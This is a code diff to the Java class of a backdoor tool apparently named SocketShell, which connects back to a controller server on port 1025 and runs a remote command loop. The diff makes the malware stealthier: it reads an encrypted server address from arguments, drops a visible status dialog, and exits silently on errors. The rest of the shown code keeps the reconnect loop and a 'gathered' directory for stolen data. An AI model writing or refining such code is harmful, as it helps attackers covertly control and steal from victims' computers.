@@ -1,11 +1,9 @@
 package com.github.thatcherdev.socketshell.backdoor;
 
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.Scanner;
-import javax.swing.JOptionPane;
 import com.github.thatcherdev.socketshell.backend.Utils;
 
 public class Backdoor {
@@ -18,9 +16,8 @@ public class Backdoor {
 	/**
 	 * Starts backdoor shell.
 	 *
-	 * If run for the first time, creates 'gathered' directory, sets {@link ip} to
-	 * server IP address using {@link getIP()}, and displays WiFi and backdoor
-	 * information if running from a USB drive.
+	 * Creates 'gathered' directory and sets {@link ip} to server IP address using
+	 * {@link args}.
 	 * <p>
 	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
 	 * initiates {@link in} and {@link out} and starts infinite loop that gets
@@ -29,25 +26,14 @@ public class Backdoor {
 	 * {@link socket}, {@link in}, and {@link out} are closed and
 	 * {@link main(String[] args} is run.
 	 *
-	 * @param args
+	 * @param args Command line arguments
 	 */
 	public static void main(String[] args) {
-		if (args.length == 0) {
-			String disp = null;
-			try {
-				ip = getIP();
-				new File("gathered").mkdir();
-				disp = "Backdoor running!\n\nTo control backdoor, connect to:\n" + Utils.currentConnection()
-						+ "\nand run option 1 in USBware";
-			} catch (Exception e) {
-				disp = "An error occurred:\n" + e.getMessage();
-			} finally {
-				if (!System.getProperty("user.dir").equals("C:\\ProgramData\\USBDrivers"))
-					JOptionPane.showMessageDialog(null, disp, "Backdoor control information",
-							JOptionPane.INFORMATION_MESSAGE);
-				if (disp.contains("An error occurred"))
-					System.exit(0);
-			}
+		try {
+			ip = Utils.crypt(args[0], "SocketShellIP");
+			new File("gathered").mkdir();
+		} catch (Exception e) {
+			System.exit(0);
 		}
 		try {
 			while (true)
@@ -72,22 +58,10 @@ public class Backdoor {
 					in.close();
 				if (out != null)
 					out.close();
-				main(new String[] { "" });
+				main(args);
 			} catch (Exception e1) {
+				System.exit(0);
 			}
 		}
-	}
-
-	/**
-	 * Gets and decrypts IP address of server form 'ip.txt'.
-	 *
-	 * @return IP address of server
-	 * @throws FileNotFoundException
-	 */
-	private static String getIP() throws FileNotFoundException {
-		Scanner in = new Scanner(new File("ip.txt"));
-		String ip = Utils.crypt(in.nextLine(), "SocketShellIP");
-		in.close();
-		return ip;
 	}
 }
